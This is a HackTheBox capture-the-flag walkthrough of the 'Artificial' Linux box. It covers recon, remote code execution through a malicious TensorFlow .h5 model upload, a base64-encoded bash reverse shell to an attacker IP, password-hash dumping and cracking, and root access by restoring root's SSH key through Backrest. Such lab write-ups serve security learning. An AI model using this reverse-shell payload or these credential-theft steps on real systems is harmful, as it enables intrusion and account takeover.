# Artificial - HackTheBox | Detailed Writeup
# Box info
**Name**: Artificial  
**OS**: Linux  
**Difficulty**: Easy  
**Box creator**: : [FisMatHack](https://app.hackthebox.com/users/1076236)  
**Writeup author**: [im4geeked](https://app.hackthebox.com/users/2732230)
# Intro 
Artificial is an easy rated box that starts with a web app upload RCE. We find the app, grab the Dockerfile/requirements, build a malicious .h5 model inside Docker using a TensorFlow RCE PoC, upload it, and get a reverse shell as app. From there we dump instance/users.db, crack an MD5 hash to get `gael`'s password, SSH in as gael, find a Backrest service and a base64'd bcrypt secret, decode + crack it, log into Backrest, restore /root/.ssh/id_rsa, and then SSH in as root. Box owned.

# Recon 
We will start this box off with a `rustscan` scan

## `NMAP` Scan explanation
```
rustscan -a 10.10.11.74 -- -sC -sV -oN nmap/full-tcp.nmap
```
`-a 10.10.11.74` -> Scan the address (`-a`) of `10.10.11.74`  
`--`  -> Pass the found ports to `NMAP` and run the following `NMAP` flags  
`-sC` -> Enumerate with `NMAP`'s default scripts (`--script=default`) for basic enumeration (e.g., service info, SSL certs, and more)  
`-sV` -> Detect and enumerate version  
`-oN nmap/full-tcp.nmap` -> Output the file in a normal readable format and store it at the `nmap` directory and call it `full-tcp.nmap`   
## Results:

```PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNABz8gRtjOqG4+jUCJb2NFlaw1auQlaXe1/+I+BhqrriREBnu476PNw6mFG9ifT57WWE/qvAZQFYRvPupReMJD4C3bE3fSLbXAoP03+7JrZkNmPRpVetRjUwP1acu7golA8MnPGzGa2UW38oK/TnkJDlZgRpQq/7DswCr38IPxvHNO/15iizgOETTTEU8pMtUm/ISNQfPcGLGc0x5hWxCPbu75OOOsPt2vA2qD4/sb9bDCOR57bAt4i+WEqp7Ri/act+f4k6vypm1sebNXeYaKapw+W83en2LnJOU0lsdhJiAPKaD/srZRZKOR0bsPcKOqLWQR/A6Yy3iRE8fcKXzfbhYbLUiXZzuUJoEMW33l8uHuAza57PdiMFnKqLQ6LBfwYs64Q3v8oAn5O7upCI/nDQ6raclTSigAKpPbliaL0HE/P7UhNacrGE7Gsk/FwADiXgEAseTn609wBnLzXyhLzLb4UVu9yFRWITkYQ6vq4ZqsiEnAsur/jt8WZY6MQ8=
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdlb8oU9PsHX8FEPY7DijTkQzsjeFKFf/xgsEav4qedwBUFzOetbfQNn3ZrQ9PMIHrguBG+cXlA2gtzK4NPohU=
|   256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH8QL1LMgQkZcpxuylBjhjosiCxcStKt8xOBU0TjCNmD
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://artificial.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
So we have port 22 running SSH on OpenSSH likely on Ubuntu, we also have port 80 running http (also signaling that it's Ubuntu) and it's redirecting us to `artificial.htb` so we'll add that to our `/etc/hosts` file (a file that's used to resolve IP addresses to domain names)  
We will add it in one single command by: 
```
echo "10.10.11.74 artificial.htb" | sudo tee -a /etc/hosts
```

# HTTP
Great!! Now we can enumerate it and see what's going on in the web app  
![alt text](/assets/img/htb/artificial/artificial-web.png)  
Seems like a normal web app for testing AI models, let's create an account and see what we can do
After registering and logging in, we can see a `requirements.txt` and a `Dockerfile`, I downloaded it and viewed the continents  
![alt text](/assets/img/htb/artificial/seeing.png)  
then, I searched some payloads for tenserflow and there were results!  
My google search:
`tenserflow rce poc`  
![alt text](/assets/img/htb/artificial/google-search.png)  
[Link to Github POC](https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py)
  
I got the `exploit.py`, read it to make sure there were no crypto miners and then got it on my VM, then I edited it to be exactly how I want it (went over to [revshells.com](https://www.revshells.com/) and got my own payload that I use regularly)

**Payload**:
```echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTAvNDQ0NCAwPiYx' | base64 -d | bash``` 
Make sure to replace it with your settings though, like your IPv4 address and port number etc etc  
## Getting our payload to work
I couldn't get it to work on the python3 virtual environment with the requirements.txt file, instead I used `Docker` for it and it worked!
### Configuring docker
```root@zack:~/htb/artificial# docker build . -t artificial
[+] Building 1.8s (8/8) FINISHED                                                                       docker:default
 => [internal] load build definition from Dockerfile                                                             0.1s 
 => => transferring dockerfile: 496B                                                                             0.0s
 => [internal] load metadata for docker.io/library/python:3.8-slim                                               0.6s 
 => [internal] load .dockerignore                                                                                0.1s
 => => transferring context: 2B                                                                                  0.0s 
 => [1/4] FROM docker.io/library/python:3.8-slim@sha256:1d52838af602b4b5a831beb13a0e4d073280665ea7be7f69ce2382f  0.0s  => CACHED [2/4] WORKDIR /code                                                                                   0.0s 
 => CACHED [3/4] RUN apt-get update &&     apt-get install -y curl &&     curl -k -LO https://files.pythonhoste  0.0s
 => CACHED [4/4] RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.w  0.0s 
 => exporting to image                                                                                           0.2s
 => => exporting layers                                                                                          0.0s 
 => => writing image sha256:9c7ea36b7d9769d237d873bb481eae19e286d4cb81b44c9f9a1e87f3cd702acd                     0.0s  => => naming to docker.io/library/artificial
```  
then we run the docker container with `-it` being interactive shell  
```
root@zack:~/htb/artificial# docker run -it -v $(pwd):/share artificial:latest 
root@276fc8f96daa:/code#
```
I also made it so that our current directory is mounted to the `share` folder in the docker container  
**NOTE:** When running the python script to execute `exploit.py` so that we can get an `.h5` file  
make sure you don't have a listener running as the docker container would connect to our listener instead of the box, instead wait for the payload to generate first  

You should get something like
```
root@276fc8f96daa:/share# python exploit.py 
2025-06-25 18:54:21.666139: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
bash: connect: Connection refused
bash: line 1: /dev/tcp/10.10.xx.xx/4444: Connection refused
/usr/local/lib/python3.8/site-packages/keras/src/engine/training.py:3000: UserWarning: You are saving your model as an HDF5 file via `model.save()`. This file format is considered legacy. We recommend using instead the native Keras format, e.g. `model.save('my_model.keras')`.
  saving_api.save_model(
  ```
Which is fine, since the `.h5` file still got generated

## Listener
Now, we upload the file to artificial and click `View Predictions` and then we get a shell!!
```
root@zack:~# nc -lvnp 4444 
Listening on 0.0.0.0 443
Connection received on 10.10.11.74 59218
bash: cannot set terminal process group (857): Inappropriate ioctl for device
bash: no job control in this shell
app@artificial:~/app$ 
```
## Stabilizing the shell
Learn more about it here:  
[Link to post](https://saeed0x1.medium.com/stabilizing-a-reverse-shell-for-interactive-access-a-step-by-step-guide-c5c32f0cb839)
```
app@artificial:~$ script /dev/null -c bash # as python3 is not on the box
Script started, file is /dev/null
app@artificial:~$ ^Z
[1]+  Stopped                 nc -lvnp 4444
root@zack:~# stty raw -echo; fg
nc -lvnp 4444
                 ‍reset
reset: unknown terminal type unknown
Terminal type? screen
app@artificial:~$
```  
## Owning `Gael`
### Enumeration  
```
app@artificial:~$ ls /home
app  gael
```  
Now, whenever I get a shell as `www-data`, `app` or something similar, i always check for database and config files because thats a easy way to escalate to a higher privileged user
Going into our home folder, and enumerating I see that the database file in the instance directory  
```
app@artificial:~/app$ sqlite3 instance/users.db   
SQLite version 3.31.1 2020-01-27 19:55:54          
Enter ".help" for usage hints.
sqlite>
sqlite> .tables
model  user
sqlite> select * from user; 
id|username|email|password
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|0xdf|0xdf@artificial.htb|9a17ef38bd5098be451a8ccaa93c0f19
```  
Now since we know `gael` is a valid username on the box and the hashes looking like MD5 hashes, i'll go over to [Crackstation](https://crackstation.net/) to crack them  
![alt text](/assets/img/htb/artificial/crackstation.png)  
```
gael:mattp005numbertwo
```
Great! Now we can SSH as `gael`  
## Privilege Escalation to `root`  
```
gael@artificial:~$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```
Hmm, seems like we are in a group `sysadm`, let's see if there are any special files that can be used by them
```
gael@artificial:~$ find / -group sysadm 2>/dev/null
/var/backups/backrest_backup.tar.gz
```
ooo there is! let's extract this tar gunzip file
```
gael@artificial:/tmp$ tar -xzvf backrest_backup.tar.gz 

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now
```
Seems like the supposed file is not in gunzip even though there is a `.gz` extension
Oh well! it is an easy fix, just remove the `z` from the command
```
gael@artificial:/tmp$ tar -xvf backrest_backup.tar.gz 
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh
``` 
there we go!!  
after that, we can see what files are available quickly by: 
```
gael@artificial:/tmp/backrest$ find . -type f
./restic
./oplog.sqlite-wal
./oplog.sqlite-shm
./.config/backrest/config.json
./oplog.sqlite.lock
./backrest
./tasklogs/logs.sqlite-shm
./tasklogs/logs.sqlite-wal
./tasklogs/logs.sqlite
./oplog.sqlite
./jwt-secret
./processlogs/backrest.log
./install.sh
```
the json file in .config looks interesting, let's give it a read
```
gael@artificial:/tmp/backrest$ cat ./.config/backrest/config.json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

ooh a bcrypt hash! but it seems like the hash is base64 encoded, let's decode it 
```
root@zack:~# echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```
We have a password, but where do we use it? At first, I thought it was `root`'s password but that didn't work. Then I looked at the local interface on the box
```
gael@artificial:/tmp/backrest$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
< SNIP >
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                   
< SNIP >   
```
Seems like there is a service running at localhost:9898, let's port forward this so we can enumerate this service on our machine  
after providing credentials, you should be able to access the service at http://localhost:9898  
ooo a service called Backrest with some version info, researching the version for vulnerabilities didn't show much though  
![alt text](/assets/img/htb/artificial/localhost.png)  
but let's log in with 
```
backrest_root:!@#$%^
```
I was then greeted by the backrest web interface  
![alt text](/assets/img/htb/artificial/greeted-by-backrest.png)  

I'll create a repo like this  
![alt text](/assets/img/htb/artificial/repo.png)   
and then a plan like this  
![alt text](/assets/img/htb/artificial/plan.png)   
then, i'll click `Backup Now`  
![alt text](/assets/img/htb/artificial/backup-now.png)   
then, i'll go to List `View` -> `Snapshot Browser` -> `/` -> `/root` -> `.ssh` -> `id_rsa` and then i'll restore it to `/tmp/id_rsa`  
![alt text](/assets/img/htb/artificial/id.png)    
Once done, we can select the task and download the file 
![alt text](/assets/img/htb/artificial/root.png)    


